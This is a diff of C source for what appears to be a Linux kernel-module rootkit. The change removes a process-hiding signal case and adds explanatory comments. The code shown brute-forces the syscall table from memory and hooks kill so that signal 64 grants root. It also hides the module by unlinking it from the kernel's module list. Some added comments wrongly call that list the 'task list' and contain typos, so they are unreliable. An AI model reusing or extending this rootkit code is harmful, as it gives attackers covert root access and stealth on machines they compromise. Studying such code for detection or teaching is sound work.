@@ -23,7 +23,6 @@ struct linux_dirent {
 };
 
 enum {
-	SIGINVIS = 31,
 	SIGSUPER = 64,
 	SIGMODINVIS = 63,
 };
@@ -48,7 +47,7 @@ unsigned long* get_syscall_table_bf(void){
 
 	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
 		syscall_table = (unsigned long *)i;
-		// sys_close is used as a reference point, can choose other points too
+		// sys_close is used as a reference point, can choose other point too
 		if (syscall_table[__NR_close] == (unsigned long)sys_close)
 			return syscall_table;
 	}
@@ -56,6 +55,8 @@ unsigned long* get_syscall_table_bf(void){
 }
 
 // return the task_struct of the given pid
+// the kernel stores the list of processes in a circular doubly linked list called the task list
+// each element in the task list is a process descriptor of the type task_struct
 struct task_struct* find_task(pid_t pid){
 	struct task_struct *p = current;
 	// Iterates over the entire task list, starting from the current process
@@ -173,13 +174,17 @@ static inline void tidy(void){
 static struct list_head *module_previous;
 static short module_hidden = 0;
 
+
 void module_show(void){
+	// THIS_MODULE is a linux defined macro, referring to the module we are writting
+	// use linux list_add function to add itself to the kernel task list, after module_previous
 	list_add(&THIS_MODULE->list, module_previous);
 	module_hidden = 0;
 }
 
 void module_hide(void){
 	module_previous = THIS_MODULE->list.prev;
+	// use linux list_del function to remove itself from the kernel task lsit
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
@@ -188,11 +193,6 @@ asmlinkage int hacked_kill(pid_t pid, int sig){
 	struct task_struct *task;
 
 	switch (sig) {
-		case SIGINVIS:
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
-			break;
 		case SIGSUPER:
 			give_root();
 			break;
